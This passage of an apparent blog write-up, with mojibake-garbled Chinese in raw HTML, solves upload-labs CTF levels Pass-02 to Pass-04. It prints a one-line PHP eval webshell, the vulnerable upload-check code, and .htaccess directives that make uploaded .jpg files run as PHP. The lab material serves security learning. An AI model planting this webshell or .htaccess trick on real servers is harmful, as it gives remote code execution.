src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-15%2017.59.31.png" style="zoom:50%;"><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'image/jpeg'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'image/png'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'image/gif'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'ä¸Šä¼ å‡ºé”™ï¼'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'æ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ï¼Œè¯·é‡æ–°ä¸Šä¼ ï¼'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>åˆ†æï¼š</p><p>å½“è¡¨å•æäº¤æ—¶ï¼Œé¦–å…ˆæ£€æŸ¥ä¸Šä¼ è·¯å¾„æ˜¯å¦å­˜åœ¨ã€‚è‹¥å­˜åœ¨ï¼Œå†åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»å‹æ˜¯å¦ä¸º JPEGã€PNG æˆ– GIF å›¾åƒã€‚è‹¥æ˜¯ï¼Œå°†ä¸´æ—¶æ–‡ä»¶ç§»åŠ¨åˆ°æŒ‡å®šè·¯å¾„ï¼Œä¸Šä¼ æˆåŠŸåˆ™ <code>$is_upload</code> è®¾ä¸º <code>true</code>ï¼Œå¦åˆ™ <code>$msg</code> æ˜¾ç¤ºâ€œä¸Šä¼ å‡ºé”™ï¼â€ã€‚è‹¥æ–‡ä»¶ç±»å‹ä¸ç¬¦ï¼Œæ˜¾ç¤ºâ€œæ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ï¼Œè¯·é‡æ–°ä¸Šä¼ ï¼â€ã€‚</p><p>è‹¥ä¸Šä¼ è·¯å¾„ä¸å­˜åœ¨ï¼Œæç¤ºæ‰‹å·¥åˆ›å»ºè¯¥è·¯å¾„ã€‚</p></blockquote><p>å½’æ ¹ç»“åº•æ˜¯åˆ¤æ–­MIMEç±»å‹ï¼Œä½†æ˜¯è¿™ä¸ªç±»å‹æ˜¯å®¢æˆ·ç«¯å¯æ§çš„ï¼Œå¯ä»¥éšæ„ä¿®æ”¹ï¼Œè¿™æ ·ä»¥æ¥åç«¯çš„æ£€æµ‹é™åˆ¶å¯ä»¥è¢«è½»æ¾ç»•è¿‡ï¼Œæ£€æµ‹å¤±å»äº†æ„ä¹‰ã€‚</p><h1 id="ä¸‰ã€Pass-03ï¼ˆåç«¯åç¼€åé»‘åå•æ£€æµ‹ï¼‰"><a href="#ä¸‰ã€Pass-03ï¼ˆåç«¯åç¼€åé»‘åå•æ£€æµ‹ï¼‰" class="headerlink" title="ä¸‰ã€Pass-03ï¼ˆåç«¯åç¼€åé»‘åå•æ£€æµ‹ï¼‰"></a>ä¸‰ã€Pass-03ï¼ˆåç«¯åç¼€åé»‘åå•æ£€æµ‹ï¼‰</h1><h2 id="3-1-é¢˜é¢"><a href="#3-1-é¢˜é¢" class="headerlink" title="3.1 é¢˜é¢"></a>3.1 é¢˜é¢</h2><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-17%2017.11.45.png" style="zoom:50%;"><p>è¿˜æ˜¯ä¸Šä¼ webshellã€‚</p><h2 id="3-2-è§£é¢˜"><a href="#3-2-è§£é¢˜" class="headerlink" title="3.2 è§£é¢˜"></a>3.2 è§£é¢˜</h2><p>ç›´æ¥ä¸Šä¼ yjh.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sxk'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-17%2017.13.59.png" style="zoom:50%;"><ul><li>å°è¯•ä¿®æ”¹MIMEç±»å‹ï¼Œè¿˜æ˜¯ä¸Šä¼ å¤±è´¥ã€‚</li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-17%2017.16.32.png" style="zoom:50%;"><p>åˆ¤æ–­å¯èƒ½æ˜¯åœ¨åç«¯ç”¨äº†åç¼€åé»‘åå•ã€‚</p><ul><li>å°è¯•å¤§å°å†™ç»•è¿‡å¤±è´¥ã€‚</li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-17%2017.18.48.png" style="zoom:50%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-17%2017.19.28.png" alt="æˆªå±2025-01-17 17.19.28" style="zoom:50%;"><ul><li>å°è¯•ä½¿ç”¨ç‰¹æ®Šåç¼€ç»•è¿‡</li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-17%2017.26.46.png" style="zoom:50%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-17%2017.27.37.png" style="zoom:50%;"><p>ä½¿ç”¨php5åç¼€ï¼Œè®¿é—®å‘ç°æ²¡æœ‰è¢«è§£ææ‰§è¡Œã€‚</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-17%2017.29.28.png" style="zoom:50%;"><ul><li>åœ¨æ–‡ä»¶ååé¢æ·»åŠ ç©ºæ ¼ç»•è¿‡å¤±è´¥</li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-17%2017.40.12.png" alt="æ·»åŠ ç©ºæ ¼ç»•è¿‡å¤±è´¥" style="zoom:50%;"><p>ä½¿ç”¨<code>phtml</code>æ—¶è²Œä¼¼è¢«è§£ææ‰§è¡Œäº†ã€‚</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-17%2017.30.00.png" style="zoom:50%;"><p>èšå‰‘getshellï¼š</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-17%2017.30.53.png" style="zoom:50%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-17%2017.31.37.png" style="zoom:80%;"><p>Flag:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">flag<span class="token punctuation">{</span>a3820578-6bcc-4b5c-afe9-b5ba026aa81c<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3-3-ä»£ç å®¡è®¡"><a href="#3-3-ä»£ç å®¡è®¡" class="headerlink" title="3.3 ä»£ç å®¡è®¡"></a>3.3 ä»£ç å®¡è®¡</h2><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-17%2017.33.11.png" style="zoom:50%;"><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'.asp'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'.aspx'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'.php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'.jsp'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//è½¬æ¢ä¸ºå°å†™</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//æ”¶å°¾å»ç©º</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"YmdHis"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                 <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'ä¸Šä¼ å‡ºé”™ï¼'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'ä¸å…è®¸ä¸Šä¼ .asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><ul><li><strong>æ–‡ä»¶å¤¹å­˜åœ¨æ€§æ£€æŸ¥</strong>ï¼šé¦–å…ˆåˆ¤æ–­<code>UPLOAD_PATH</code>æŒ‡å®šçš„æ–‡ä»¶å¤¹æ˜¯å¦å­˜åœ¨ï¼Œè‹¥ä¸å­˜åœ¨åˆ™æç¤ºæ‰‹å·¥åˆ›å»ºã€‚</li><li><strong>é»‘åå•å®šä¹‰</strong>ï¼šå®šä¹‰äº†ä¸€ä¸ª<code>$deny_ext</code>æ•°ç»„ï¼ŒåŒ…å«ç¦æ­¢ä¸Šä¼ çš„æ–‡ä»¶åç¼€<code>.asp</code>ã€<code>.aspx</code>ã€<code>.php</code>ã€<code>.jsp</code>ã€‚</li><li><strong>æ–‡ä»¶åå¤„ç†</strong>ï¼šè·å–ä¸Šä¼ æ–‡ä»¶çš„åç§°ï¼Œå¹¶é€šè¿‡<code>deldot</code>å‡½æ•°åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ï¼Œç„¶åé€šè¿‡<code>strrchr</code>å‡½æ•°è·å–æ–‡ä»¶æ‰©å±•åï¼Œå¹¶è½¬æ¢ä¸ºå°å†™ï¼Œå»é™¤å­—ç¬¦ä¸²<code>::$DATA</code>ï¼Œæœ€åæ”¶å°¾å»ç©ºã€‚</li><li><strong>åç¼€åæ£€æŸ¥</strong>ï¼šåˆ¤æ–­å¤„ç†åçš„æ–‡ä»¶æ‰©å±•åæ˜¯å¦åœ¨é»‘åå•æ•°ç»„ä¸­ï¼Œè‹¥ä¸åœ¨åˆ™æ‰§è¡Œæ–‡ä»¶ä¸Šä¼ æ“ä½œï¼Œå°†ä¸´æ—¶æ–‡ä»¶ç§»åŠ¨åˆ°æŒ‡å®šè·¯å¾„ï¼›è‹¥åœ¨é»‘åå•ä¸­åˆ™æç¤ºä¸å…è®¸ä¸Šä¼ è¯¥åç¼€æ–‡ä»¶ã€‚</li></ul></blockquote><h1 id="å››ã€Pass-04ï¼ˆåç«¯åç¼€åé»‘åå•æ£€æµ‹-htaccessè§£æç»•è¿‡ï¼‰"><a href="#å››ã€Pass-04ï¼ˆåç«¯åç¼€åé»‘åå•æ£€æµ‹-htaccessè§£æç»•è¿‡ï¼‰" class="headerlink" title="å››ã€Pass-04ï¼ˆåç«¯åç¼€åé»‘åå•æ£€æµ‹-.htaccessè§£æç»•è¿‡ï¼‰"></a>å››ã€Pass-04ï¼ˆåç«¯åç¼€åé»‘åå•æ£€æµ‹-.htaccessè§£æç»•è¿‡ï¼‰</h1><h2 id="4-1-é¢˜é¢"><a href="#4-1-é¢˜é¢" class="headerlink" title="4.1 é¢˜é¢"></a>4.1 é¢˜é¢</h2><p>å’Œä¹‹å‰ä¸€æ ·ã€‚</p><h2 id="4-2-è§£é¢˜"><a href="#4-2-è§£é¢˜" class="headerlink" title="4.2 è§£é¢˜"></a>4.2 è§£é¢˜</h2><ul><li>ç›´æ¥ä¸Šä¼ yjh.php</li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-17%2017.47.44.png" style="zoom:50%;"><p>æç¤ºï¼Œæ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ã€‚</p><ul><li>ä¿®æ”¹ Content-Type: image/jpeg å°è¯•ç»•è¿‡å¤±è´¥ã€‚</li><li>+åç¼€åæ”¹æˆ.phtmlï¼Œç»•è¿‡å¤±è´¥</li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-17%2017.50.38.png" style="zoom:50%;"><ul><li>ç›´æ¥æ”¹æˆjpg</li></ul><p>è¿™æ„å‘³è¿™æ”¾å¼ƒäº†é€šè¿‡ç›´æ¥ä¸Šä¼ è„šæœ¬è®©æœåŠ¡ç«¯è§£ææ‰§è¡Œï¼Œåç»­å¯èƒ½éœ€è¦ç»“åˆæ–‡ä»¶åŒ…å«æ¼æ´åˆ©ç”¨ã€‚</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-17%2017.52.40.png" style="zoom:50%;"><p>æˆåŠŸä¸Šä¼ äº†ï¼Œè¯´æ˜å¹¶æ²¡æœ‰æ£€æµ‹æ–‡ä»¶å†…å®¹ï¼ˆé€šå¸¸æ˜¯æ£€æµ‹æ–‡ä»¶å¤´ï¼‰ã€‚</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-17%2017.58.44.png" style="zoom:50%;"><ul><li>å°è¯•ä¸Šä¼ .htaccessæ–‡ä»¶è¦†ç›–æœåŠ¡ç«¯é…ç½®ï¼Œä½¿å…¶å°†jpgæ–‡ä»¶å½“ä½œphpè„šæœ¬è§£æã€‚</li></ul><blockquote><p>è¦é€šè¿‡<code>.htaccess</code>æ–‡ä»¶å°†<code>.jpg</code>æ–‡ä»¶å½“ä½œPHPè„šæœ¬è§£æï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‡ ç§é…ç½®æ–¹æ³•ï¼š</p><h4 id="æ–¹æ³•ä¸€ï¼šä½¿ç”¨AddTypeæŒ‡ä»¤"><a href="#æ–¹æ³•ä¸€ï¼šä½¿ç”¨AddTypeæŒ‡ä»¤" class="headerlink" title="æ–¹æ³•ä¸€ï¼šä½¿ç”¨AddTypeæŒ‡ä»¤"></a>æ–¹æ³•ä¸€ï¼šä½¿ç”¨<code>AddType</code>æŒ‡ä»¤</h4><p>è¿™æ˜¯æœ€ç›´æ¥çš„æ–¹æ³•ï¼Œé€šè¿‡<code>AddType</code>æŒ‡ä»¤å°†<code>.jpg</code>æ–‡ä»¶çš„MIMEç±»å‹è®¾ç½®ä¸ºPHPè„šæœ¬çš„ç±»å‹ï¼Œä»è€Œè®©ApacheæœåŠ¡å™¨å°†å…¶å½“ä½œPHPæ–‡ä»¶è§£æã€‚</p><p>apacheå¤åˆ¶</p><pre class="line-numbers language-apache" data-language="apache"><code class="language-apache">AddType application/x-httpd-php .jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å°†ä¸Šè¿°ä»£ç æ·»åŠ åˆ°<code>.htaccess</code>æ–‡ä»¶ä¸­ï¼Œä¸Šä¼ çš„<code>.jpg</code>æ–‡ä»¶å°±ä¼šè¢«å½“ä½œPHPæ–‡ä»¶æ‰§è¡Œã€‚</p><h4 id="æ–¹æ³•äºŒï¼šä½¿ç”¨æŒ‡ä»¤"><a href="#æ–¹æ³•äºŒï¼šä½¿ç”¨æŒ‡ä»¤" class="headerlink" title="æ–¹æ³•äºŒï¼šä½¿ç”¨<FilesMatch>æŒ‡ä»¤"></a>æ–¹æ³•äºŒï¼šä½¿ç”¨<code>&lt;FilesMatch&gt;</code>æŒ‡ä»¤</h4><p>è¿™ç§æ–¹æ³•å¯ä»¥æ›´ç²¾ç¡®åœ°æ§åˆ¶å“ªäº›æ–‡ä»¶è¢«å½“ä½œPHPè„šæœ¬è§£æï¼ŒåŒæ—¶è¿˜å¯ä»¥æ·»åŠ ä¸€äº›é¢å¤–çš„å®‰å…¨æªæ–½æˆ–é…ç½®ã€‚</p><p>apacheå¤åˆ¶</p><pre class="line-numbers language-apache" data-language="apache"><code class="language-apache">&lt;FilesMatch "\.jpg$"&gt;    SetHandler application/x-httpd-php&lt;/FilesMatch&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>è¿™æ®µä»£ç ä½¿ç”¨<code>&lt;FilesMatch&gt;</code>æŒ‡ä»¤åŒ¹é…ä»¥<code>.jpg</code>ç»“å°¾çš„æ–‡ä»¶ï¼Œå¹¶é€šè¿‡<code>SetHandler</code>æŒ‡ä»¤å°†è¿™äº›æ–‡ä»¶çš„å¤„ç†æ–¹å¼è®¾ç½®ä¸ºPHPè„šæœ¬çš„å¤„ç†æ–¹å¼ã€‚</p><h4 id="æ–¹æ³•ä¸‰ï¼šä½¿ç”¨AddHandleræŒ‡ä»¤"><a href="#æ–¹æ³•ä¸‰ï¼šä½¿ç”¨AddHandleræŒ‡ä»¤" class="headerlink" title="æ–¹æ³•ä¸‰ï¼šä½¿ç”¨AddHandleræŒ‡ä»¤"></a>æ–¹æ³•ä¸‰ï¼šä½¿ç”¨<code>AddHandler</code>æŒ‡ä»¤</h4><p><code>AddHandler</code>æŒ‡ä»¤ä¹Ÿå¯ä»¥ç”¨æ¥å°†ç‰¹å®šæ–‡ä»¶åç¼€çš„æ–‡ä»¶ä¸ç‰¹å®šçš„å¤„ç†å™¨å…³è”èµ·æ¥ï¼Œä»è€Œå®ç°æ–‡ä»¶è§£æçš„é‡å†™ã€‚</p><p>apacheå¤åˆ¶</p><pre class="line-numbers language-apache" data-language="apache"><code class="language-apache">AddHandler application/x-httpd-php .jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™è¡Œä»£ç çš„ä½œç”¨ä¸<code>AddType</code>æŒ‡ä»¤ç±»ä¼¼ï¼Œä½†<code>AddHandler</code>åœ¨æŸäº›é…ç½®ç¯å¢ƒä¸‹å¯èƒ½æ›´åŠ çµæ´»ã€‚</p><ol><li><strong>æœåŠ¡å™¨é…ç½®</strong>ï¼šç¡®ä¿æœåŠ¡å™¨çš„é…ç½®å…è®¸<code>.htaccess</code>æ–‡ä»¶ä¸­çš„è¿™äº›æŒ‡ä»¤ç”Ÿæ•ˆã€‚æœ‰äº›æœåŠ¡å™¨å¯èƒ½å‡ºäºå®‰å…¨è€ƒè™‘ç¦ç”¨äº†<code>.htaccess</code>æ–‡ä»¶çš„æŸäº›åŠŸèƒ½ã€‚</li><li><strong>æƒé™é—®é¢˜</strong>ï¼šç¡®ä¿ä½ æœ‰æƒé™ä¸Šä¼ å¹¶ä¿®æ”¹<code>.htaccess</code>æ–‡ä»¶ï¼Œä»¥åŠæœåŠ¡å™¨çš„é…ç½®å…è®¸<code>.htaccess</code>æ–‡ä»¶è¦†ç›–ä¸»é…ç½®æ–‡ä»¶ä¸­çš„è®¾ç½®ã€‚</li></ol></blockquote><p>ä¸ºäº†æŸ¥çœ‹æ–¹ä¾¿ï¼ˆmacä¸Šé»˜è®¤ä¸æ˜¾ç¤º.å¼€å¤´çš„éšè—æ–‡ä»¶ï¼Œæ‡’çš„é…ç½®äº†ï¼‰å†™å…¥äº†htaccessæ–‡ä»¶ï¼Œä¸Šä¼ çš„æ—¶å€™æ”¹ä¸€ä¸‹æ–‡ä»¶åå°±å¯ä»¥ã€‚</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-17%2018.01.12.png" style="zoom:50%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-17%2018.06.27.png" style="zoom:50%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-17%2018.07.10.png" style="zoom:50%;"><p>å†æ¬¡è®¿é—®ä¸Šä¼ çš„å›¾ç‰‡ï¼Œå‘ç°æ²¡æœ‰åŠ è½½å›¾ç‰‡å¤±è´¥çš„æƒ…å†µï¼Œåˆ¤æ–­æ—¶.htaccessæ–‡ä»¶ç”Ÿæ•ˆäº†ã€‚</p><p>èšå‰‘getshell</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-17%2018.08.36.png" style="zoom:50%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-17%2018.08.58.png" alt="æˆªå±2025-01-17 18.08.58" style="zoom:50%;"><p>æˆåŠŸè·å–åˆ°flagï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">flag<span class="token punctuation">{</span>f58c7bc4-bf87-40e7-8949-9b8608560e74<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="4-3-ä»£ç å®¡è®¡"><a 